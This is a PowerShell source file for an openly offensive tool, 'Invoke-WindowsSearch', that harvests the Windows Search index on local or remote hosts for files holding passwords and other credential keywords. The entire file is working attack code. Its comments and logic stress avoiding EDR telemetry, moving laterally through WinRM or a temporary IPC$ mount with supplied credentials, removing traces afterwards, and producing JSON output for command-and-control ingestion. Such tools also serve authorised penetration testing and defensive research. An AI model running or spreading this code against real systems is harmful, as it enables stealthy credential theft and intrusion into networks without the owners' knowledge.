function Invoke-WindowsSearch {
<#
.SYNOPSIS
    LotL Windows Search Index Harvester for Stealthy Credential Discovery.

.DESCRIPTION
    Invoke-WindowsSearch is a file-less reconnaissance tool designed to query the local or 
    remote Windows Search database (SystemIndex) via the native OLE DB provider. 
    Because it asks the database for file contents rather than crawling the disk, 
    it generates near-zero EDR file-read telemetry and avoids heavy SMB network traffic.

    OpSec Routing:
    - No Credentials: Uses implicit user context over native RPC/DCOM (Port 135).
    - Explicit Credentials: Automatically attempts a WinRM tunnel (Port 5985). If WinRM is blocked, 
      it falls back to an authenticated RPC tunnel via a temporary IPC$ SMB mount.

.PARAMETER TargetHost
    The hostname or IP address of the remote target. Leave blank to search the localhost.

.PARAMETER SearchString
    A single keyword to hunt for (e.g., "keepass", "password"). 
    Note: OLE DB only supports suffix wildcards (e.g., "pass*").

.PARAMETER WordList
    Path to a text file containing multiple keywords. The script will automatically sanitize 
    the list and chunk the SQL queries into batches of 10 to prevent database crashes.

.PARAMETER Scope
    Limits the search to a specific directory using AQS syntax. 
    Local: "file:///C:/Users"
    Remote: "file://WIN-102/IT_Archive"

.PARAMETER Credential
    A PSCredential object. Triggers WinRM or IPC$ fallback for lateral execution.

.PARAMETER IncludePattern
    Filters the final output by FILENAME wildcard (e.g., "*.config", "*pass*"). 
    WARNING: This does NOT search file contents via regex.

.PARAMETER ExcludePattern
    Filters out specific filenames from the final results (e.g., "*.tmp").

.PARAMETER OutputFormat
    Choose between Table (default), CSV, or JSON for C2 ingestion.

.PARAMETER OutputPath
    The file path to save the CSV or JSON output.

.EXAMPLE
    # 1. The Local Sniper Shot
    Invoke-WindowsSearch -SearchString "keepass" -Scope "file:///C:/Users"

.EXAMPLE
    # 2. The Remote Implicit Sweep (No Creds / Native RPC)
    Invoke-WindowsSearch -TargetHost "WIN-102" -WordList ".\searchstrings.txt"

.EXAMPLE
    # 3. The Lateral Pivot (Explicit Creds / WinRM or IPC$ Fallback)
    $creds = Get-Credential
    Invoke-WindowsSearch -TargetHost "RTR-FS01" -WordList ".\searchstrings.txt" -Credential $creds

.EXAMPLE
    # 4. The Targeted Configuration Hunt (Filtering output to specific filetypes)
    Invoke-WindowsSearch -TargetHost "WIN-102" -WordList ".\searchstrings.txt" -IncludePattern "*.config" -OutputFormat JSON

.NOTES
    Author: Fady Moheb AKA [N1NJ10]
    Target Limitation: This tool will FAIL on Windows Server targets (like Domain Controllers) 
    if the "Windows Search" (WSearch) service is disabled, which is the default Server OS configuration.
    Regex Limitation: OLE DB does not support complex Regex (e.g., AWS tokens). Use ripgrep instead.
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$TargetHost,                     

        [Parameter(Mandatory=$false)]
        [string]$SearchString,                    

        [Parameter(Mandatory=$false)]
        [string]$WordList,                         

        [Parameter(Mandatory=$false)]
        [string]$Scope,                             

        [Parameter(Mandatory=$false)]
        [pscredential]$Credential,                  

        [Parameter(Mandatory=$false)]
        [ValidateSet('Table','CSV','JSON')]
        [string]$OutputFormat = 'Table',            

        [Parameter(Mandatory=$false)]
        [string]$OutputPath,                         

        [Parameter(Mandatory=$false)]
        [int]$MaxResults = 0,                         

        [Parameter(Mandatory=$false)]
        [string]$IncludePattern,                      

        [Parameter(Mandatory=$false)]
        [string]$ExcludePattern                       
    )

    # -----------------------------------------------------------------
    # 1. Validate inputs
    # -----------------------------------------------------------------
    if (-not $SearchString -and -not $WordList) {
        Write-Error "[-] You must provide either -SearchString or -WordList."
        return
    }

    # -----------------------------------------------------------------
    # 2. Build keyword list with safe sanitization
    # -----------------------------------------------------------------
    $CleanKeywords = @()
    if ($SearchString) {
        $CleanKeywords += $SearchString.Trim()
    }

    if ($WordList) {
        if (-not (Test-Path $WordList)) {
            Write-Error "[-] Wordlist not found: $WordList"
            return
        }
        $RawWords = Get-Content $WordList | Where-Object { $_ -match '\S' }
        foreach ($Word in $RawWords) {
            # Remove only truly dangerous characters (null, newline, carriage return)
            $Sanitized = $Word -replace "[\0\r\n]", ""
            # Allow a broad set of common credential characters
            if ($Sanitized.Trim().Length -gt 2) {
                $CleanKeywords += $Sanitized.Trim()
            }
        }
    }

    $CleanKeywords = $CleanKeywords | Select-Object -Unique
    if ($CleanKeywords.Count -eq 0) {
        Write-Error "[-] No valid keywords remain after sanitization."
        return
    }

    # -----------------------------------------------------------------
    # 3. Dynamic Protocol Routing (WinRM vs Authenticated RPC)
    # -----------------------------------------------------------------
    $UseRemoteSession = $false
    $UseAuthenticatedRPC = $false
    $PSSession = $null

    if ($TargetHost -and $Credential) {
        Write-Host "[*] Explicit credentials provided. Testing WinRM (Port 5985) on $TargetHost..." -ForegroundColor Cyan
        try {
            $PSSession = New-PSSession -ComputerName $TargetHost -Credential $Credential -ErrorAction Stop
            $UseRemoteSession = $true
            Write-Host "[+] WinRM connection established successfully." -ForegroundColor Green
        }
        catch {
            Write-Warning "[-] WinRM connection failed. Port may be blocked by firewall."
            Write-Host "[*] Executing fallback protocol: Authenticated RPC via IPC`$ mapping..." -ForegroundColor Yellow
            $UseAuthenticatedRPC = $true
        }
    }
    elseif ($TargetHost -and -not $Credential) {
        Write-Warning "[!] No credential provided. Attempting implicit RPC OLE DB query using current user context."
    }

    # -----------------------------------------------------------------
    # 4. Helper to escape double quotes inside CONTAINS clauses
    # -----------------------------------------------------------------
    function Get-SafeContainsClause($Word) {
        # Escape any double quotes inside the word by doubling them (SQL escape)
        $Escaped = $Word -replace '"', '""'
        # Wrap the double quotes inside single quotes for valid SQL syntax
        return "CONTAINS(*, '`"$Escaped`"')"
    }

    # -----------------------------------------------------------------
    # 5. Batch processing (local or remote)
    # -----------------------------------------------------------------
    $BatchSize = 10
    $TotalBatches = [math]::Ceiling($CleanKeywords.Count / $BatchSize)
    $MasterResults = @()

    if ($UseRemoteSession) {
        # -----------------------------------------------------------------
        # 5A. WinRM Execution Block
        # -----------------------------------------------------------------
        $ScriptBlock = {
            param($Keywords, $Scope, $BatchSize, $MaxResults, $IncludePattern, $ExcludePattern)
            $connectionString = "Provider=Search.CollatorDSO.1;Extended Properties='Application=Windows'"
            $localResults = @()
            $totalKeywords = $Keywords.Count
            $batches = [math]::Ceiling($totalKeywords / $BatchSize)
            for ($i = 0; $i -lt $batches; $i++) {
                $chunk = $Keywords | Select-Object -Skip ($i * $BatchSize) -First $BatchSize
                $clauses = foreach ($w in $chunk) {
                    $esc = $w -replace '"', '""'
                    "CONTAINS(*, '`"$esc`"')"
                }
                $where = $clauses -join " OR "
                $query = "SELECT System.ItemName, System.ItemPathDisplay, System.Size, System.DateModified FROM SystemIndex WHERE ($where)"
                if ($Scope) { $query += " AND SCOPE='$Scope'" }
                
                try {
                    $adapter = New-Object System.Data.OleDb.OleDbDataAdapter($query, $connectionString)
                    $ds = New-Object System.Data.DataSet
                    $null = $adapter.Fill($ds)
                    if ($ds.Tables[0].Rows.Count -gt 0) {
                        $localResults += $ds.Tables[0]
                    }
                } catch { Write-Warning "Batch $i failed: $_" }
                
                if ($MaxResults -gt 0 -and $localResults.Count -ge $MaxResults) {
                    $localResults = $localResults | Select-Object -First $MaxResults
                    break
                }
            }
            # Apply filename filters - using dot notation for WinRM compatibility
            if ($IncludePattern -or $ExcludePattern) {
                $filtered = $localResults | Where-Object {
                    $name = $_."System.ItemName"
                    ( -not $IncludePattern -or $name -like $IncludePattern ) -and
                    ( -not $ExcludePattern -or $name -notlike $ExcludePattern )
                }
                $localResults = $filtered
            }
            return $localResults
        }
        
        Write-Progress -Activity "Searching $TargetHost" -Status "Executing WinRM query" -PercentComplete 50
        try {
            $MasterResults = Invoke-Command -Session $PSSession -ScriptBlock $ScriptBlock -ArgumentList @(,$CleanKeywords, $Scope, $BatchSize, $MaxResults, $IncludePattern, $ExcludePattern)
            Remove-PSSession $PSSession
            Write-Progress -Activity "Searching $TargetHost" -Completed
        }
        catch {
            Write-Error "[-] Remote session execution failed: $_"
            return
        }
    }
    else {
        # -----------------------------------------------------------------
        # 5B. Native RPC Execution Block (With or without IPC$ fallback)
        # -----------------------------------------------------------------
        $Catalog = "SystemIndex"
        if ($TargetHost -and $TargetHost -ne "localhost" -and $TargetHost -ne $env:COMPUTERNAME) {
            $Catalog = "$TargetHost.SystemIndex"
        }

        # Handle the Authenticated RPC IPC$ Trick
        if ($UseAuthenticatedRPC) {
            $NetCred = $Credential.GetNetworkCredential()
            $User = $Credential.UserName
            $Pass = $NetCred.Password
            
            # Silently destroy any old conflicting connections to this host
            net use "\\$TargetHost\IPC$" /d /y 2>$null | Out-Null
            
            # Map the IPC$ share to force the explicit credentials into the session
            $netResult = net use "\\$TargetHost\IPC$" $Pass /user:$User 2>&1
            if ($LASTEXITCODE -ne 0) {
                Write-Error "[-] Fallback failed. Could not map IPC$ for RPC authentication. Error: $netResult"
                return
            }
            Write-Host "[+] IPC`$ tunnel mapped. Executing database query..." -ForegroundColor Green
        }

        $connectionString = "Provider=Search.CollatorDSO.1;Extended Properties='Application=Windows'"

        for ($i = 0; $i -lt $TotalBatches; $i++) {
            Write-Progress -Activity "Searching" -Status "Batch $($i+1)/$TotalBatches" -PercentComplete (($i+1)/$TotalBatches*100)
            $chunk = $CleanKeywords | Select-Object -Skip ($i * $BatchSize) -First $BatchSize
            $clauses = foreach ($w in $chunk) { Get-SafeContainsClause $w }
            $where = $clauses -join " OR "
            $query = "SELECT System.ItemName, System.ItemPathDisplay, System.Size, System.DateModified FROM $Catalog WHERE ($where)"
            if ($Scope) { $query += " AND SCOPE='$Scope'" }
            
            try {
                $adapter = New-Object System.Data.OleDb.OleDbDataAdapter($query, $connectionString)
                $ds = New-Object System.Data.DataSet
                $null = $adapter.Fill($ds)
                if ($ds.Tables[0].Rows.Count -gt 0) {
                    $MasterResults += $ds.Tables[0]
                }
            } catch { Write-Verbose "Batch $i failed: $_" }
            
            if ($MaxResults -gt 0 -and $MasterResults.Count -ge $MaxResults) {
                $MasterResults = $MasterResults | Select-Object -First $MaxResults
                break
            }
        }
        Write-Progress -Activity "Searching" -Completed

        # Clean up the IPC$ trick so we don't leave traces
        if ($UseAuthenticatedRPC) {
            net use "\\$TargetHost\IPC$" /d /y 2>$null | Out-Null
            Write-Verbose "[*] IPC`$ tunnel dismantled."
        }
    }

    # -----------------------------------------------------------------
    # 6. Apply filename filters (if not already done in remote)
    # -----------------------------------------------------------------
    if (-not $UseRemoteSession) {
        if ($IncludePattern -or $ExcludePattern) {
            $filtered = $MasterResults | Where-Object {
                $name = $_."System.ItemName"
                ( -not $IncludePattern -or $name -like $IncludePattern ) -and
                ( -not $ExcludePattern -or $name -notlike $ExcludePattern )
            }
            $MasterResults = $filtered
        }
    }

    if ($MasterResults.Count -eq 0) {
        Write-Host "[-] No matches found." -ForegroundColor DarkGray
        return
    }

    # -----------------------------------------------------------------
    # 7. Format and output results
    # -----------------------------------------------------------------
    # Dot notation syntax for cross-compatibility with WinRM deserialization
    $DisplayResults = $MasterResults | Select-Object @{N='Name';E={$_."System.ItemName"}},
                                                     @{N='Path';E={$_."System.ItemPathDisplay"}},
                                                     @{N='Size';E={$_."System.Size"}},
                                                     @{N='Modified';E={$_."System.DateModified"}} -Unique

    switch ($OutputFormat) {
        'Table' {
            Write-Host "`n[+] Hits confirmed!" -ForegroundColor Green
            $DisplayResults | Format-Table -AutoSize
        }
        'CSV' {
            $csv = $DisplayResults | ConvertTo-Csv -NoTypeInformation
            if ($OutputPath) {
                $csv | Out-File -Encoding utf8 $OutputPath
                Write-Host "`n[+] CSV saved to $OutputPath" -ForegroundColor Green
            } else { $csv }
        }
        'JSON' {
            $json = $DisplayResults | ConvertTo-Json
            if ($OutputPath) {
                $json | Out-File -Encoding utf8 $OutputPath
                Write-Host "`n[+] JSON saved to $OutputPath" -ForegroundColor Green
            } else { $json }
        }
    }
}
